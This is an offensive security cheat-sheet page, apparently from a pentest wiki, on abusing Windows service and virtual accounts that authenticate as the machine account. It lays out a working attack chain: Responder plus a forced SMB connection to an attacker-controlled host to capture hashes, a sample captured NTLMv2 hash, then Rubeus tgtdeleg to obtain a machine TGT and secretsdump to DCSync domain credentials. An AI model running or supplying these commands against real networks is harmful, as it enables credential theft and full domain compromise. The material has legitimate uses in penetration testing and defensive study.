# Abusing Service / Virtual Accounts

_SYSTEM_, _NT AUTHORITY, NT SERVICE_ and [Microsoft Virtual Accounts](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/service-accounts#bkmk-virtualserviceaccounts) all authenticate on the network as the machine account on domain-joined systems. The 2 most notable are [IIS](https://support.microsoft.com/en-us/help/4466942/understanding-identities-in-iis) (`iis apppool\defaultapppool`) and [MSSQL](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-ver15) (`nt service\mssql$sqlexpress`)

{% embed url="https://superuser.com/questions/248315/list-of-hidden-virtual-windows-user-accounts" %}

This can easily be verified with the following :

```shellscript
# From the attacker machine, run responder to capture the hash
sudo responder -I <INTERFACE>

# From the service account shell
net use \\<ATTACKER_IP>\share

# Ex => we see the machine account is used
[SMB] NTLMv2-SSP Client   : ::ffff:10.10.11.187
[SMB] NTLMv2-SSP Username : flight\G0$
[SMB] NTLMv2-SSP Hash     : G0$::flight:1e589bf41238cf8e:547002306786919B6BB28F45BC6EEA4F:010100000000000080ADD9B1DBEAD801A1870276D7F4D729000000000200080052004F003500320001001E00570049004E002D00450046004B004A004B0059004500500037003900500004003400570049004E002D00450046004B004A004B005900450050003700390050002E0052004F00350032002E004C004F00430041004C000300140052004F00350032002E004C004F00430041004C000500140052004F00350032002E004C004F00430041004C000700080080ADD9B1DBEAD80106000400020000000800300030000000000000000000000000300000B1315E28BC96528147F3929B329DC4FE9D27ADEB96DF3BCF9F6C892CCB4443D80A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0036000000000000000000
```

In any situation where the machine is domain-joined and we can run code as **NT AUTHORITY, NT SERVICE** or a **Microsoft Virtual Account**, we can use RBCD for local privilege escalation, provided that Active directory hasn't been hardered to mitigate the RBCD attacks completely (which is very rarely the case).

### Exploit

As we can authenticate as the machine account, we can request a TGT, which will then let us DCSync

```shellscript
# Use Rubeus to get a TGT as the machine account
.\rubeus.exe tgtdeleg /nowrap

# Convert the kirbi file to ccache for linux 
kirbi2ccache ticket.kirbi ticket.ccache

# Export the ticket
export KRB5CCNAME=ticket.ccache 

# DCSync
secretsdump.py -k -no-pass <IP>
```

{% embed url="https://exploit.ph/delegate-2-thyself.html" %}
